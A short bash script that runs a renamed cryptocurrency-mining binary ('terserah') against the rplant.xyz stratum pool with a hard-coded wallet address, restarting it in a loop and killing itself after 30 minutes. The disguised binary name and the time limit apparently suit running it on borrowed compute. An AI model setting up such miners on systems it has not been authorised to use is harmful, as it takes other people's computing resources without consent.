#!/bin/bash
{
  sleep 1800s
  kill $$
} &

while true
do
  ./terserah -a yespowerTIDE -o stratum+tcps://stratum-eu.rplant.xyz:17059 -u TXkYzpfpPE3vqQknkgmxc4CngKmQVj5eSM.myworker
  sleep 1
done
